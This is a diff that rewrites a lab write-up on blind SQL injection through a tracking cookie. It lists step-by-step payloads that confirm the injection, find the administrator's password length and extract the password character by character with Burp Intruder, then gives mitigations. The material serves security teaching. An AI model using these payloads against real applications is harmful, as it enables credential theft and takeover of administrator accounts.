@@ -1,39 +1,68 @@
-# SQL Injection - Blind sqli with conditional response
+# SQL Injection – Blind SQLi (Conditional Response)
 
-# Vulnerability Overview 
-    This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
-    The results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.
+# Vulnerability Overview
+* The application is vulnerable to blind SQL Injection via the TrackingId cookie. The response includes a “Welcome back” message when a query condition evaluates to true, enabling data extraction through conditional responses.
 
 # Steps to Reproduce
-
-**Lab Link** --> https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
-
 *Navigate to*
 * /filter?category=Pets
 
-*Confirm Injection point*
-* Intercept the request (Burp)
-* Send to repeter
-* category=Pets' → No error or changes in site.
-* Tracking Id= xyz'; → No error → Welcome back! massage disappered.
-* Tracking Id= xyz'--; → Welcome back! massage re-appered. → Injection point confirmed.
+*Identify injection point (Cookie)*
+* Intercept request using Burp Suite and modify TrackingId
 
-*Confirm condition response*
-* TrackingId=xyz' and 1=1-- → No change
-* TrackingId=xyz' and 1=2-- → Welcome back! Massage disappered (Conditional response confirmed)
-* TrackingId=' or 1=1 -- → Welcome back! Massage will only appear when condition is true.
+* * TrackingId=xyz'
 
-*Extract the username*
-* TrackingId=' or (select 'a')='a; → No change
-* TrackingId=' or (select 'a' from users where username='administrator')='a → No change
+* * * “Welcome back” message disappears
+* * * Confirms SQL injection
 
-*Confirm Password length*
-* TrackingId=' or (select 'a' from users where username='administrator' and length(password)>19)='a → No change
-* TrackingId=' or (select 'a' from users where username='administrator' and length(password)>20)='a → Welcome back! disappered → condition is false → password length is 20 characters
+*Confirm conditional behavior*
+* TrackingId=xyz' AND 1=1--
+* * “Welcome back” visible (TRUE)
 
-*Extract password*
-* TrackingId=' or (select substring(password,1,1) from users where username='administrator')='a → Welcome back! disappered → false condition → first caracter of password is not a
-* Send request to intruder (Ctrl+i) → select sniper attack → select a and click on add 
-* add payload items a-z and 0-9 
-* Click setting → Scroll to Grep-Extract → Click on box → Click on Add → search welcome → select welcome back! → click OK  → Start attack
-* 
+* * TrackingId=xyz' AND 1=2--
+
+* * * “Welcome back” disappears (FALSE) → Confirms conditional response
+
+*Confirm existence of administrator user*
+* TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
+* * “Welcome back” visible → User exists
+
+*Determine password length*
+* TrackingId=xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>20--
+* * FALSE
+
+* TrackingId=xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20--
+* * TRUE → Password length = 20
+
+*Extract password (character by character)*
+* TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
+* TRUE/FALSE used to determine each character
+
+Repeat for positions 1–20.
+
+*Automate using Burp Intruder*
+* Attack type: Sniper
+* Payload: a–z, 0–9
+* Use Grep Match: “Welcome back”
+* Extract correct character per position
+
+*Login*
+* Username: administrator
+* Password: extracted password
+
+* * Successful login
+
+# Payload Used
+* ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
+
+# Impact
+* An attacker can extract sensitive data such as user credentials through blind SQL injection, leading to full account compromise, including administrative access.
+
+# Tools Used
+* Burp Suite (Proxy, Repeater, Intruder)
+
+# Mitigation
+* Use parameterized queries
+* Avoid dynamic SQL
+* Implement proper input validation
+* Disable verbose response indicators
